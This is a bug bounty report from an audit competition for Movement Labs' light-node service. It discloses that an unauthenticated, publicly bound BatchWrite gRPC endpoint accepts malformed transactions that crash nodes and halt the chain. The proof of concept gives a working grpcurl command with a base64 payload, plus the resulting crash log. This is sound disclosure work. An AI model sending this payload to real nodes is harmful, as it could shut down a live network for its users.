# #43243 \[BC-Critical] Attacker can halt chains operating in sequencer mode

**Submitted on Apr 4th 2025 at 01:38:59 UTC by @usmannk for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43243
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/da/movement/protocol/light-node>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

The batch\_write rpc call can be abused by attackers to write malformed transactions to the Celestia network. When this is read back as a block the node panics and crashes.

## Vulnerability Details

The batch\_write RPC method does not have access control. Further, the LightNodeService is bound to the ip address 0.0.0.0 in both the default and suggested (<https://docs.movementnetwork.xyz/assets/files/config-4551e1260977506ebb8dcdea19b254ed.json>) configurations. Because 0.0.0.0 allows requests from not just the local host but any IP address on the internet, an attacker may call this RPC to write arbitrary movement transactions to DA. The Aptos Transaction within this Movement Transaction can be malformed.

If a malformed Aptos transaction is written in this way, nodes will crash when reading it from DA.

Ostensibly there is prevalidation to assert that the submitted transaction is a valid Aptos transaction. However, when nodes are running in the default and suggested configuration, they do not have Whitelist Prevalidation enabled. The Aptos transaction prevalidation is, presumably erroneously, done inside Whitelist Prevalidation so it is also disabled by default.

Even if this prevalidation is enabled, a malicious sequencer can still sign and submit such a malformed block. However, in the default and suggested configuration, any party may execute this attack.

## Impact Details

Attackers can insert malformed transactions into the canonical chain, signed by the DA signer and persisted to DA.

## Proof of Concept

## Proof of Concept

* run movement stack by calling `just movement-full-node native build.setup.celestia-local.eth-local`
* send a call to `BatchWrite` with an invalid tx:

```
grpcurl -v -plaintext -d '{"blobs":[{"data":"eyJkYXRhIjpbMF0sImFwcGxpY2F0aW9uX3ByaW9yaXR5IjowLCJzZXF1ZW5jZV9udW1iZXIiOjAsImlkIjpbMTU3LDIxLDU1LDQzLDI0LDQ4LDExNSw5MCwxMCw0NSw1LDMzLDcwLDEwNSwyMjcsMzksMjYsMTE3LDc0LDE3Miw3MCwyNTQsNDgsNTksMTA0LDE4Nyw0OCw3MCwxLDU4LDUsMTE2XX0K"}]}' localhost:30730 movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService/BatchWrite
```

* Observe the chain crashes:

```
2025-04-02T01:18:23.338583Z  INFO execute_block{block_id=9c4286604b26de55f5e8e904e6be068c3cf9394a59bf724e93c6a96cb6234cdc}: movement_full_node::node::tasks::execute_settle: Failed to execute block: unexpected end of input. Retrying
thread 'tokio-runtime-worker' panicked at /Users/usmannkhan/.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.41.1/src/runtime/blocking/shutdown.rs:51:21:
Cannot drop a runtime in a context where blocking is not allowed. This happens when a runtime is dropped from within an asynchronous context.
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
Error: task 61 panicked with message "Cannot drop a runtime in a context where blocking is not allowed. This happens when a runtime is dropped from within an asynchronous context."
```

The base64 encoded data above is the following transaction: `"data":[0],"application_priority":0,"sequence_number":0,"id":[157,21,55,43,24,48,115,90,10,45,5,33,70,105,227,39,26,117,74,172,70,254,48,59,104,187,48,70,1,58,5,116]}`

The bytes `[0]` is not a valid Aptos Transaction and thus the node panics when trying to execute it within a block.
